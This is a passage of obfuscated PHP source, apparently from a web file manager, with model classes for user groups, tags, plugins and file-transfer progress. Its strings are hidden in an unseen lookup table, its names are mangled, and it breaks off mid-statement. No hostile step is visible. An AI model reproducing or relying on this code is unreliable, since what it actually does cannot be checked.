$…ëšè“õöó¢ô =& $_SERVER[ÀÆ]; $ä¬Ô² = $this->where(array($…ëšè“õöó¢ô[396] => $óŠøÃ“È›Ç))->getField($…ëšè“õöó¢ô[28], !0); if (!$ä¬Ô² || !in_array($ Ò–È, $ä¬Ô²)) { return $ Ò–È; } for ($™‡ë‹ = 1; $™‡ë‹ <= count($ä¬Ô²) + 1; $™‡ë‹++) { $§„ùãÓ„ÛŠ = $ Ò–È . "\x28{$™‡ë‹}\x29"; if (!in_array($§„ùãÓ„ÛŠ, $ä¬Ô²)) { return $§„ùãÓ„ÛŠ; } } } public function groupSwitch($ä®, $¹´ç•ı„¶¿¸) { $Äô„ßÀ‹¶šÊÓ =& $_SERVER[ÀÆ]; $º½°“£ = array($Äô„ßÀ‹¶šÊÓ[1739] => array($Äô„ßÀ‹¶šÊÓ[7], array($ä®, $¹´ç•ı„¶¿¸))); $²ÈõãÏº½Ë€ = $this->where($º½°“£)->select(); $²ÈõãÏº½Ë€ = array_to_keyvalue($²ÈõãÏº½Ë€, $Äô„ßÀ‹¶šÊÓ[1739]); if (!isset($²ÈõãÏº½Ë€[$ä®]) || !isset($²ÈõãÏº½Ë€[$¹´ç•ı„¶¿¸]) || $²ÈõãÏº½Ë€[$ä®][$Äô„ßÀ‹¶šÊÓ[492]] == 0) { return !1; } $º½°“£ = array($Äô„ßÀ‹¶šÊÓ[1739] => $ä®); $üÁŒ = Model($Äô„ßÀ‹¶šÊÓ[1828])->where($º½°“£)->select(); if (!$üÁŒ) { $üÁŒ = array(); } foreach ($üÁŒ as $¶¡á) { $Š¡¯İù = $¶¡á[$Äô„ßÀ‹¶šÊÓ[1572]]; $º½°“£ = array($Äô„ßÀ‹¶šÊÓ[1572] => $Š¡¯İù, $Äô„ßÀ‹¶šÊÓ[1739] => $¹´ç•ı„¶¿¸); $Ã­™«ß = Model($Äô„ßÀ‹¶šÊÓ[1828])->where($º½°“£)->find(); if (!$Ã­™«ß) { $åë¨¯ïó = array($¹´ç•ı„¶¿¸ => $¶¡á[$Äô„ßÀ‹¶šÊÓ[1842]]); Model($Äô„ßÀ‹¶šÊÓ[532])->userGroupAdd($Š¡¯İù, $åë¨¯ïó); } Model($Äô„ßÀ‹¶šÊÓ[532])->userGroupRemove($Š¡¯İù, $ä®); } $º½°“£ = array($Äô„ßÀ‹¶šÊÓ[406] => 2, $Äô„ßÀ‹¶šÊÓ[492] => 0, $Äô„ßÀ‹¶šÊÓ[405] => 1, $Äô„ßÀ‹¶šÊÓ[498] => array($Äô„ßÀ‹¶šÊÓ[7], array($ä®, $¹´ç•ı„¶¿¸))); $ö» = Model($Äô„ßÀ‹¶šÊÓ[817])->where($º½°“£)->field($Äô„ßÀ‹¶šÊÓ[1843])->select(); $ö» = array_to_keyvalue($ö», $Äô„ßÀ‹¶šÊÓ[498], $Äô„ßÀ‹¶šÊÓ[397]); $Óé®Ø = !empty($ö»[$ä®]) ? $ö»[$ä®] : !1; if ($Óé®Ø) { if (!$ö»[$¹´ç•ı„¶¿¸]) { $ö»[$¹´ç•ı„¶¿¸] = Model($Äô„ßÀ‹¶šÊÓ[817])->groupRootAdd($¹´ç•ı„¶¿¸); } $‚Àß = $ö»[$¹´ç•ı„¶¿¸]; $º½°“£ = array($Äô„ßÀ‹¶šÊÓ[492] => $Óé®Ø); $ö» = Model($Äô„ßÀ‹¶šÊÓ[817])->where($º½°“£)->field($Äô„ßÀ‹¶šÊÓ[1844])->select(); if (!$ö») { $ö» = array(); } Model($Äô„ßÀ‹¶šÊÓ[817])->moveClearAuth = !1; foreach ($ö» as $ÓÍÏşˆ”ú) { $ûà ‘ = $ÓÍÏşˆ”ú[$Äô„ßÀ‹¶šÊÓ[405]] == $Äô„ßÀ‹¶šÊÓ[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Äô„ßÀ‹¶šÊÓ[817])->move($ÓÍÏşˆ”ú[$Äô„ßÀ‹¶šÊÓ[397]], $‚Àß, $ûà ‘); } Model($Äô„ßÀ‹¶šÊÓ[817])->moveClearAuth = !0; $º½°“£ = array($Äô„ßÀ‹¶šÊÓ[406] => 2, $Äô„ßÀ‹¶šÊÓ[498] => $ä®); $÷³ÏÕ…¥¼Åòç = array($Äô„ßÀ‹¶šÊÓ[498] => $¹´ç•ı„¶¿¸); Model($Äô„ßÀ‹¶šÊÓ[1845])->where($º½°“£)->save($÷³ÏÕ…¥¼Åòç); Model($Äô„ßÀ‹¶šÊÓ[1846])->where($º½°“£)->save($÷³ÏÕ…¥¼Åòç); } $this->_changeChildLevel($²ÈõãÏº½Ë€[$ä®], $²ÈõãÏº½Ë€[$¹´ç•ı„¶¿¸], !0); $this->where(array($Äô„ßÀ‹¶šÊÓ[492] => $ä®))->save(array($Äô„ßÀ‹¶šÊÓ[492] => $¹´ç•ı„¶¿¸)); $this->_clearChildrenCache($²ÈõãÏº½Ë€[$¹´ç•ı„¶¿¸]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\141\166"; protected function cacheFunctionAlias($ºÁ¹ı©ºÎ»ô) { $´ =& $_SERVER[ÀÆ]; return array($´[1847] => array($ºÁ¹ı©ºÎ»ô[0], $´[1848]), $´[1849] => array($ºÁ¹ı©ºÎ»ô[0], $´[1850])); } protected function get($®µø¸Õ) { $×÷ =& $_SERVER[ÀÆ]; $¾¿È„éŒĞÙîû = Model($×÷[516])->metaGet($®µø¸Õ, $×÷[1851]); $ğı = json_decode($¾¿È„éŒĞÙîû, !0); return $ğı ? $ğı : array($×÷[1852] => $×÷[87], $×÷[367] => array()); } protected function set($¾Èõ¡¤¼, $”ÖÁÛä»Ü) { $ÉñÛÒÔ¾ˆ =& $_SERVER[ÀÆ]; $”ÖÁÛä»Ü = $”ÖÁÛä»Ü ? $”ÖÁÛä»Ü : array($ÉñÛÒÔ¾ˆ[1852] => $ÉñÛÒÔ¾ˆ[87], $ÉñÛÒÔ¾ˆ[367] => array()); Model($ÉñÛÒÔ¾ˆ[516])->metaSet($¾Èõ¡¤¼, $ÉñÛÒÔ¾ˆ[1851], json_encode($”ÖÁÛä»Ü)); return Model($ÉñÛÒÔ¾ˆ[516])->metaSet($¾Èõ¡¤¼, $ÉñÛÒÔ¾ˆ[1851], json_encode($”ÖÁÛä»Ü)); } protected function getByTagID($Ø“•Ê’ÊÂ®, $À¢Î£®÷–·Ã) { $ı“ =& $_SERVER[ÀÆ]; if (!$Ø“•Ê’ÊÂ® || !$À¢Î£®÷–·Ã) { return !1; } if (!Model($ı“[516])->getInfoSimple($Ø“•Ê’ÊÂ®)) { return !1; } $ğ½¤À– = $this->get($Ø“•Ê’ÊÂ®); if (!$ğ½¤À– || !isset($ğ½¤À–[$ı“[367]])) { return !1; } $şØğ·¬ª§ = array_find_by_field($ğ½¤À–[$ı“[367]], $ı“[395], $À¢Î£®÷–·Ã); return is_array($şØğ·¬ª§) ? $şØğ·¬ª§ : !1; } public function listSource($çœš¯¶, $¥Ş¶Ä‘) { $¡ˆØ» =& $_SERVER[ÀÆ]; if ($¥Ş¶Ä‘ && !is_array($¥Ş¶Ä‘)) { $¥Ş¶Ä‘ = array($¥Ş¶Ä‘); } $ÈÍå = $this->listData($çœš¯¶); $Ã©™ÉõñçÓ = array(); foreach ($ÈÍå as $Œß) { $ÍäÃ = $Œß[$¡ˆØ»[76]]; if (!$ÍäÃ) { continue; } if (!isset($Ã©™ÉõñçÓ[$ÍäÃ])) { $Ã©™ÉõñçÓ[$ÍäÃ] = array(); } $Ã©™ÉõñçÓ[$ÍäÃ][] = $Œß[$¡ˆØ»[421]]; } $ë•ô÷Ô± = array(); foreach ($Ã©™ÉõñçÓ as $í¤ÖÍ¼Ğ => $Ø¸›–Ô´Šéé) { $Ç— = !0; if (!$¥Ş¶Ä‘) { $ë•ô÷Ô±[] = $í¤ÖÍ¼Ğ; continue; } foreach ($¥Ş¶Ä‘ as $„³”­„¨) { if (!in_array($„³”­„¨, $Ø¸›–Ô´Šéé)) { $Ç— = !1; break; } } if ($Ç—) { $ë•ô÷Ô±[] = $í¤ÖÍ¼Ğ; } } if (!$ë•ô÷Ô±) { return array(); } $—ßÈ = array($¡ˆØ»[412] => array($¡ˆØ»[413], $ë•ô÷Ô±), $¡ˆØ»[498] => $çœš¯¶, $¡ˆØ»[406] => SourceModel::TYPE_GROUP); $±İ»à„ÍèµÌ = Model($¡ˆØ»[1250])->listSource($—ßÈ); if (!$±İ»à„ÍèµÌ || count($ë•ô÷Ô±) == $±İ»à„ÍèµÌ[$¡ˆØ»[364]][$¡ˆØ»[365]]) { return $±İ»à„ÍèµÌ; } $çãêé‰ = array(); $€½¯‡†Ûš° = array_to_keyvalue($±İ»à„ÍèµÌ[$¡ˆØ»[75]], $¡ˆØ»[33], $¡ˆØ»[397]); $©ÉÜ•ßĞÖ = array_to_keyvalue($±İ»à„ÍèµÌ[$¡ˆØ»[74]], $¡ˆØ»[33], $¡ˆØ»[397]); $‡ìáù¸ıá½Òµ = array_merge($©ÉÜ•ßĞÖ, $€½¯‡†Ûš°); foreach ($ë•ô÷Ô± as $ÍäÃ) { if (!in_array($ÍäÃ, $‡ìáù¸ıá½Òµ)) { $çãêé‰[] = $ÍäÃ; } } if ($çãêé‰) { $this->removeBySource($çœš¯¶, $çãêé‰); } return $±İ»à„ÍèµÌ; } protected function listData($Âàë¾Ş¼) { $“Êâä« =& $_SERVER[ÀÆ]; $†åøß = array($“Êâä«[1563] => 0, $“Êâä«[477] => array($“Êâä«[1853], 0), $“Êâä«[417] => $“Êâä«[1854] . $Âàë¾Ş¼); $Áç£ = $“Êâä«[1855]; $ñ¸— = $this->field($Áç£)->where($†åøß)->order($“Êâä«[1856])->select(); return $ñ¸— ? $ñ¸— : array(); } protected function addToTag($Ï›“ÍÀªã, $áÇÈÜè¤ú¢, $â˜Ñ‚¨—) { $Ò€Ñ¤àéË =& $_SERVER[ÀÆ]; if (!$this->getByTagID($Ï›“ÍÀªã, $â˜Ñ‚¨—) || !$áÇÈÜè¤ú¢) { return !1; } if (!Model($Ò€Ñ¤àéË[817])->pathInfo($áÇÈÜè¤ú¢)) { return !1; } $«š×µÆÈôÏ = array($Ò€Ñ¤àéË[1563] => 0, $Ò€Ñ¤àéË[477] => $â˜Ñ‚¨—, $Ò€Ñ¤àéË[416] => $áÇÈÜè¤ú¢, $Ò€Ñ¤àéË[417] => $Ò€Ñ¤àéË[1857] . $Ï›“ÍÀªã, $Ò€Ñ¤àéË[415] => $Ò€Ñ¤àéË[33], $Ò€Ñ¤àéË[1743] => 0); if ($this->where($«š×µÆÈôÏ)->find()) { return !1; } return $this->add($«š×µÆÈôÏ); } protected function removeFromTag($¶­ı¥¿şâ÷€, $ö“, $Ã‚‹¸È—÷) { $”ÄÄ =& $_SERVER[ÀÆ]; if (!$this->getByTagID($¶­ı¥¿şâ÷€, $Ã‚‹¸È—÷) || !$ö“) { return !1; } if (is_array($ö“)) { $ö“ = array($”ÄÄ[7], $ö“); } $Ğ™ö½Ä«…¯ÍÕ = array($”ÄÄ[1563] => 0, $”ÄÄ[477] => $Ã‚‹¸È—÷, $”ÄÄ[417] => $”ÄÄ[1857] . $¶­ı¥¿şâ÷€, $”ÄÄ[416] => $ö“); return $this->where($Ğ™ö½Ä«…¯ÍÕ)->delete(); } protected function removeByTag($Á„, $®ñ¸ğ) { $µ–¨õÁİôò· =& $_SERVER[ÀÆ]; if (!$this->getByTagID($Á„, $®ñ¸ğ)) { return !1; } $×ä´õÇõÉ° = array($µ–¨õÁİôò·[1563] => 0, $µ–¨õÁİôò·[477] => $®ñ¸ğ, $µ–¨õÁİôò·[417] => $µ–¨õÁİôò·[1857] . $Á„); return $this->where($×ä´õÇõÉ°)->delete(); } protected function removeBySource($›ü…¾§’Œº, $Œ”Ó) { $Ï¶»£î =& $_SERVER[ÀÆ]; if (!$›ü…¾§’Œº || !$Œ”Ó) { return !1; } if (is_array($Œ”Ó)) { $Œ”Ó = array($Ï¶»£î[7], $Œ”Ó); } $ìˆıìşÕêŸ  = array($Ï¶»£î[1563] => 0, $Ï¶»£î[416] => $Œ”Ó, $Ï¶»£î[477] => array($Ï¶»£î[1005], 0), $Ï¶»£î[417] => $Ï¶»£î[1857] . $›ü…¾§’Œº); return $this->where($ìˆıìşÕêŸ )->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\160\x6c\x75\x67\151\x6e\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\164\141\x74\165\x73", "\162\x65\x67\151\145\x73\164", "\x63\x6f\x6e\x66\151\x67"); public function loadList($È×ã²À = false) { $¯â° = array_to_keyvalue($this->listData(), $_SERVER[ÀÆ][28]); if ($È×ã²À) { return $¯â°[$È×ã²À]; } return $¯â°; } public function init() { $©¹Ìèî´úÜ =& $_SERVER[ÀÆ]; Hook::trigger($©¹Ìèî´úÜ[1858]); $¿È‚ = $this->loadPluginList(); foreach ($¿È‚ as $±€Ô¾™ => $¢È¯Ğ) { $˜¾½¼êüÌî” = $this->appAllow($±€Ô¾™, $¢È¯Ğ); if (!$˜¾½¼êüÌî”) { continue; } foreach ($¢È¯Ğ[$©¹Ìèî´úÜ[1859]] as $®÷ => $î«) { Hook::bind($®÷, $î«); } } Hook::trigger($©¹Ìèî´úÜ[1860]); Hook::trigger(ACTION); } public function appAllow($Ùü, $Û£¥İ¿, $ñ»ò† = true) { $÷œ =& $_SERVER[ÀÆ]; $ŠøË£ŒÛ ±± = PLUGIN_DIR . $Ùü . $÷œ[1861]; if (!is_array($Û£¥İ¿) || !is_array($Û£¥İ¿[$÷œ[1859]]) || $Û£¥İ¿[$÷œ[735]] != 1 || !is_file($ŠøË£ŒÛ ±±)) { return !1; } if ($GLOBALS[$÷œ[499]] == 1) { return !0; } if ($ñ»ò† && !Action($÷œ[1862])->checkAuth($Ùü)) { return !1; } return !0; } public function unInstall($ò¥’…) { $õÚ‹†ÀˆîËá =& $_SERVER[ÀÆ]; $©ÂÕşÄßıÂÉº = $this->loadList($ò¥’…); if (file_exists(PLUGIN_DIR . $ò¥’…)) { Hook::apply($ò¥’… . $õÚ‹†ÀˆîËá[1863]); } $this->remove($©ÂÕşÄßıÂÉº[$õÚ‹†ÀˆîËá[395]]); } public function changeStatus($İò, $÷²ëĞâùÒ¹¡) { $òõ =& $_SERVER[ÀÆ]; $²èèúøàîØù = $this->loadList($İò); if ($÷²ëĞâùÒ¹¡) { Hook::apply($İò . $òõ[1864]); } $this->update($²èèúøàîØù[$òõ[395]], array($òõ[1865] => $÷²ëĞâùÒ¹¡)); } public function appRegist($ÀÚªŠ, $©­¶õÎŒÆ) { $¿´êØÆ =& $_SERVER[ÀÆ]; $œ”ì± = $this->loadList($ÀÚªŠ); if ($œ”ì±) { $this->update($œ”ì±[$¿´êØÆ[395]], array($¿´êØÆ[1859] => $©­¶õÎŒÆ)); } else { $šÖİ = array($¿´êØÆ[28] => $ÀÚªŠ, $¿´êØÆ[1859] => $©­¶õÎŒÆ, $¿´êØÆ[735] => 0, $¿´êØÆ[6] => $this->getConfigDefault($ÀÚªŠ)); $this->insert($šÖİ); } } public function getConfigDefault($é°¯Í‹–á) { $ŒËÍò =& $_SERVER[ÀÆ]; $–‡“£š¹ = array(); $ÚÚŠÖ­ğíö = $this->getPackageJson($é°¯Í‹–á); if (!$ÚÚŠÖ­ğíö && is_array($ÚÚŠÖ­ğíö[$ŒËÍò[1866]])) { return $–‡“£š¹; } foreach ($ÚÚŠÖ­ğíö[$ŒËÍò[1866]] as $è†Úò => $Á¬«È) { if (!isset($Á¬«È[$ŒËÍò[372]]) || isset($–‡“£š¹[$è†Úò])) { continue; } $–‡“£š¹[$è†Úò] = $Á¬«È[$ŒËÍò[372]]; } return $–‡“£š¹; } public function getPackageJson($¾ê‹ä­) { return Hook::apply($¾ê‹ä­ . $_SERVER[ÀÆ][1867]); } public function getConfig($ã³¥Óë¨Ğ, $ÊîÅœ = false) { $«æúÖœµø =& $_SERVER[ÀÆ]; $Š¹¶¸˜› = array(); $ØíüóÛ–³¥ = $this->loadList($ã³¥Óë¨Ğ); if ($ØíüóÛ–³¥ && is_array($ØíüóÛ–³¥[$«æúÖœµø[6]])) { $Š¹¶¸˜› = $ØíüóÛ–³¥[$«æúÖœµø[6]]; } if (!$Š¹¶¸˜› || $ÊîÅœ) { $Š¹¶¸˜› = $this->getConfigDefault($ã³¥Óë¨Ğ); } return $Š¹¶¸˜›; } public function setConfig($ñÎÏÍãß£®™, $çîµ³ÅÅşöÓ = false) { $åÁ†‡ =& $_SERVER[ÀÆ]; $§ä = $this->loadList($ñÎÏÍãß£®™); if (!$§ä) { return !1; } $È”ñ§€Õ = $§ä[$åÁ†‡[6]]; if ($çîµ³ÅÅşöÓ == !1) { $È”ñ§€Õ = array(); $çîµ³ÅÅşöÓ = $this->getConfigDefault($ñÎÏÍãß£®™); } foreach ($çîµ³ÅÅşöÓ as $‘ö¡Ú† => $í¤ç) { $È”ñ§€Õ[$‘ö¡Ú†] = is_string($í¤ç) ? trim($í¤ç) : $í¤ç; } $this->update($§ä[$åÁ†‡[395]], array($åÁ†‡[6] => $È”ñ§€Õ)); } public function viewList() { $õâ· =& $_SERVER[ÀÆ]; $Ê›Ä§¿±ç = $this->loadList(); $this->pluginScan($Ê›Ä§¿±ç); $Ê›Ä§¿±ç = $this->loadPluginList(); $âÖ­ÂöÅ± = array(); foreach ($Ê›Ä§¿±ç as $­²¹üÈÀßí => $á¬ùòã•¬í˜) { unset($á¬ùòã•¬í˜[$õâ·[1859]], $á¬ùòã•¬í˜[$õâ·[6]]); $Î«•ıÛË = PLUGIN_DIR . $á¬ùòã•¬í˜[$õâ·[28]] . $õâ·[1861]; if (!is_file($Î«•ıÛË)) { continue; } $½èË = Hook::apply($á¬ùòã•¬í˜[$õâ·[28]] . $õâ·[1867]); if (is_array($½èË)) { $âÖ­ÂöÅ±[$­²¹üÈÀßí] = array_merge($á¬ùòã•¬í˜, $½èË); } } return $âÖ­ÂöÅ±; } private function loadPluginList() { $Û’ =& $_SERVER[ÀÆ]; $»ùÖúçÅÇï = $this->loadList(); if (strtolower(MOD) == $Û’[1868]) { return $»ùÖúçÅÇï; } $¦øİÅ«¦†Ö = Hook::trigger($Û’[1869], $»ùÖúçÅÇï); if ($»ùÖúçÅÇï && !$¦øİÅ«¦†Ö) { die; } return $¦øİÅ«¦†Ö ? $¦øİÅ«¦†Ö : $»ùÖúçÅÇï; } private function pluginScan($·ôú¼Ã½´©) { $¶ÒèúÔÕæ¢Ì =& $_SERVER[ÀÆ]; recursion_dir(PLUGIN_DIR, $ì¾ãÈœ›á™, $Ùû÷˜ˆ´ãÄ, 0); foreach ($ì¾ãÈœ›á™ as $ÜÎÚÓ™æùê) { $­¢Ò¥ò¯¤ = get_path_this($ÜÎÚÓ™æùê); if (isset($·ôú¼Ã½´©[$­¢Ò¥ò¯¤]) || !file_exists($ÜÎÚÓ™æùê . $¶ÒèúÔÕæ¢Ì[1870]) || !file_exists($ÜÎÚÓ™æùê . $¶ÒèúÔÕæ¢Ì[1861])) { continue; } Hook::apply($­¢Ò¥ò¯¤ . $¶ÒèúÔÕæ¢Ì[1864]); } } } goto B¤ªŠµØ‰í; Eßá´‘šù: class TaskFileTransfer extends Task { protected function startAfter() { $íÂÁÜ¬‰Ì =& $_SERVER[ÀÆ]; $õ—ôÏ¬Ïµ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($íÂÁÜ¬‰Ì[1598], array($this, $íÂÁÜ¬‰Ì[1599])); Hook::bind($íÂÁÜ¬‰Ì[1142], array($this, $íÂÁÜ¬‰Ì[1600])); Hook::bind($íÂÁÜ¬‰Ì[1601], array($this, $íÂÁÜ¬‰Ì[1602])); Hook::bind($íÂÁÜ¬‰Ì[592], array($this, $íÂÁÜ¬‰Ì[1603])); Hook::bind($íÂÁÜ¬‰Ì[593], array($this, $íÂÁÜ¬‰Ì[1604])); Hook::bind($íÂÁÜ¬‰Ì[595], array($this, $íÂÁÜ¬‰Ì[1605])); Hook::bind($íÂÁÜ¬‰Ì[596], array($this, $íÂÁÜ¬‰Ì[1605])); Hook::bind($íÂÁÜ¬‰Ì[562], array($this, $íÂÁÜ¬‰Ì[1606])); Hook::bind($íÂÁÜ¬‰Ì[559], array($this, $íÂÁÜ¬‰Ì[1606])); Hook::bind($íÂÁÜ¬‰Ì[564], array($this, $íÂÁÜ¬‰Ì[1606])); Hook::bind($íÂÁÜ¬‰Ì[566], array($this, $íÂÁÜ¬‰Ì[1606])); Hook::bind($íÂÁÜ¬‰Ì[568], array($this, $íÂÁÜ¬‰Ì[1606])); Hook::bind($íÂÁÜ¬‰Ì[1607], array($this, $íÂÁÜ¬‰Ì[1608])); Hook::bind($íÂÁÜ¬‰Ì[585], array($this, $íÂÁÜ¬‰Ì[1609])); $this->sourceModelCopyFlag = !1; Hook::bind($íÂÁÜ¬‰Ì[1610], array($this, $íÂÁÜ¬‰Ì[1611])); Hook::bind($íÂÁÜ¬‰Ì[1612], array($this, $íÂÁÜ¬‰Ì[1613])); Hook::bind($íÂÁÜ¬‰Ì[1614], array($this, $íÂÁÜ¬‰Ì[1615])); $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1616]] = LNG($íÂÁÜ¬‰Ì[1617]); $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1618]] = 0; $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1619]] = 0; $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1056]] = $íÂÁÜ¬‰Ì[33]; $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1620]] = $íÂÁÜ¬‰Ì[33]; $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1621]] = 0; $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1622]] = 0; $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1623]] = 0; if (!$õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1474]]) { $õ—ôÏ¬Ïµ[$íÂÁÜ¬‰Ì[1474]] = LNG($íÂÁÜ¬‰Ì[1624]); } } protected function endAfter() { $ÀÚóÊ« =& $_SERVER[ÀÆ]; Hook::unbind($ÀÚóÊ«[1598], array($this, $ÀÚóÊ«[1599])); Hook::unbind($ÀÚóÊ«[1142], array($this, $ÀÚóÊ«[1600])); Hook::unbind($ÀÚóÊ«[1601], array($this, $ÀÚóÊ«[1602])); Hook::unbind($ÀÚóÊ«[592], array($this, $ÀÚóÊ«[1603])); Hook::unbind($ÀÚóÊ«[593], array($this, $ÀÚóÊ«[1604])); Hook::unbind($ÀÚóÊ«[595], array($this, $ÀÚóÊ«[1605])); Hook::unbind($ÀÚóÊ«[596], array($this, $ÀÚóÊ«[1605])); Hook::unbind($ÀÚóÊ«[562], array($this, $ÀÚóÊ«[1606])); Hook::unbind($ÀÚóÊ«[559], array($this, $ÀÚóÊ«[1606])); Hook::unbind($ÀÚóÊ«[564], array($this, $ÀÚóÊ«[1606])); Hook::unbind($ÀÚóÊ«[566], array($this, $ÀÚóÊ«[1606])); Hook::unbind($ÀÚóÊ«[568], array($this, $ÀÚóÊ«[1606])); Hook::unbind($ÀÚóÊ«[1607], array($this, $ÀÚóÊ«[1608])); Hook::unbind($ÀÚóÊ«[585], array($this, $ÀÚóÊ«[1609])); Hook::unbind($ÀÚóÊ«[1610], array($this, $ÀÚóÊ«[1611])); Hook::unbind($ÀÚóÊ«[1612], array($this, $ÀÚóÊ«[1613])); Hook::unbind($ÀÚóÊ«[1614], array($this, $ÀÚóÊ«[1615])); } public function copyMoveStart($§úØòà¤¯, $Õ…Ö˜¿ÉŸÆü, $Ïå·îªÊ¶, $ôğœû¼) { $¹‰àšğ¡ =& $_SERVER[ÀÆ]; self::log($¹‰àšğ¡[1625] . $Õ…Ö˜¿ÉŸÆü . $¹‰àšğ¡[67] . $ôğœû¼); $ßË•Ù­ = rtrim(TEMP_FILES, $¹‰àšğ¡[8]); if (substr($Õ…Ö˜¿ÉŸÆü, 0, strlen($ßË•Ù­)) == $ßË•Ù­) { return; } if (substr($ôğœû¼, 0, strlen($ßË•Ù­)) == $ßË•Ù­) { return; } $·¢ =& $this->task; $·¢[$¹‰àšğ¡[1626]] = KodIO::transferType($§úØòà¤¯, $Ïå·îªÊ¶); $this->update(); } public function updateAfter() { $öôÓ…‘ =& $_SERVER[ÀÆ]; $¹¶åãç¸ =& $this->task; if (!$¹¶åãç¸[$öôÓ…‘[748]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¹¶åãç¸[$öôÓ…‘[1626]] == $öôÓ…‘[1227]) { return; } self::updateTask($¹¶åãç¸); } private static function updateTask(&$¼Üééêí) { $ıÄŒŞ¯ =& $_SERVER[ÀÆ]; if ($¼Üééêí[$ıÄŒŞ¯[1626]] == $ıÄŒŞ¯[1126] || $¼Üééêí[$ıÄŒŞ¯[1626]] == $ıÄŒŞ¯[107]) { if ($¼Üééêí[$ıÄŒŞ¯[1620]]) { $¼Üééêí[$ıÄŒŞ¯[1623]] = $¼Üééêí[$ıÄŒŞ¯[1622]] + $¼Üééêí[$ıÄŒŞ¯[1619]]; } } else { if ($¼Üééêí[$ıÄŒŞ¯[1626]] == $ıÄŒŞ¯[1228]) { if ($¼Üééêí[$ıÄŒŞ¯[1620]] == $ıÄŒŞ¯[1126]) { $¼Üééêí[$ıÄŒŞ¯[1623]] = $¼Üééêí[$ıÄŒŞ¯[1622]] + $¼Üééêí[$ıÄŒŞ¯[1619]] * 0.5; } else { if ($¼Üééêí[$ıÄŒŞ¯[1620]] == $ıÄŒŞ¯[107]) { $¼Üééêí[$ıÄŒŞ¯[1623]] = $¼Üééêí[$ıÄŒŞ¯[1622]] + $¼Üééêí[$ıÄŒŞ¯[1618]] * 0.5 + $¼Üééêí[$ıÄŒŞ¯[1619]] * 0.5; } } } } $¼Üééêí[$ıÄŒŞ¯[1573]] = $¼Üééêí[$ıÄŒŞ¯[1623]] / $¼Üééêí[$ıÄŒŞ¯[748]]; if ($¼Üééêí[$ıÄŒŞ¯[1573]] > 0) { $Î¿ùá = timeFloat() - $¼Üééêí[$ıÄŒŞ¯[774]] - $¼Üééêí[$ıÄŒŞ¯[1576]]; $¼Üééêí[$ıÄŒŞ¯[1577]] = $Î¿ùá * (1 - $¼Üééêí[$ıÄŒŞ¯[1573]]) / $¼Üééêí[$ıÄŒŞ¯[1573]]; } } public function addPath($µØàûïƒŸÇİ) { $à· =& $_SERVER[ÀÆ]; if (!$µØàûïƒŸÇİ) { return; } $øû =& $this->task; $ø’¨ÎŒùÉÀ = IO::infoWithChildren($µØàûïƒŸÇİ); $µÂ£ = $øû[$à·[1627]] ? $øû[$à·[1627]][$à·[1628]] : 0; $øû[$à·[1627]] = array($à·[1628] => $µÂ£ + 1, $à·[415] => $ø’¨ÎŒùÉÀ[$à·[28]], $à·[76] => $ø’¨ÎŒùÉÀ[$à·[76]], $à·[513] => $ø’¨ÎŒùÉÀ[$à·[513]] ? $ø’¨ÎŒùÉÀ[$à·[513]] : $ø’¨ÎŒùÉÀ[$à·[76]]); if ($ø’¨ÎŒùÉÀ[$à·[29]] == $à·[193]) { $øû[$à·[1054]] += 1; } else { $øû[$à·[1054]] += $ø’¨ÎŒùÉÀ[$à·[81]][$à·[79]]; if ($ø’¨ÎŒùÉÀ[$à·[397]]) { $øû[$à·[1054]] += $ø’¨ÎŒùÉÀ[$à·[81]][$à·[80]] + 1; } } $øû[$à·[748]] += $ø’¨ÎŒùÉÀ[$à·[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($¢Ü£§ı) { $å’ŠÖ­ =& $_SERVER[ÀÆ]; $Ì÷ŠÎ‡÷ =& $this->task; $Ì÷ŠÎ‡÷[$å’ŠÖ­[1616]] = $¢Ü£§ı[$å’ŠÖ­[28]]; $Ì÷ŠÎ‡÷[$å’ŠÖ­[1056]] = $¢Ü£§ı[$å’ŠÖ­[28]]; $this->update(); } public function copyFileStart($½ç«êºî, $éÓÁ¨÷¸ßÁÙ, $Ëñ“‡·, $˜¥»¢âƒ, $Êöï, $„ìÅ²„Éˆã¢) { $ñ¤ŞÓöâµ =& $_SERVER[ÀÆ]; $ô€ûæ³ùÙ­ = $Êöï; if ($ô€ûæ³ùÙ­ == $GLOBALS[$ñ¤ŞÓöâµ[1629]]) { $ô€ûæ³ùÙ­ = $GLOBALS[$ñ¤ŞÓöâµ[1630]]; } $GLOBALS[$ñ¤ŞÓöâµ[1630]] = $Êöï; $GLOBALS[$ñ¤ŞÓöâµ[1629]] = $„ìÅ²„Éˆã¢; $ÄŠŠÚœ†® =& $this->task; $ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[1616]] = $ô€ûæ³ùÙ­; $ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[1618]] = (int) $½ç«êºî->size($éÓÁ¨÷¸ßÁÙ); $ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[1619]] = 0; $ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[1056]] = $ñ¤ŞÓöâµ[33]; $ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[1620]] = $ñ¤ŞÓöâµ[33]; $ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[1621]] = 0; $ƒÜöÙ€Ÿ›€÷ = $ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[1618]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[395]] . $ñ¤ŞÓöâµ[1631]); if 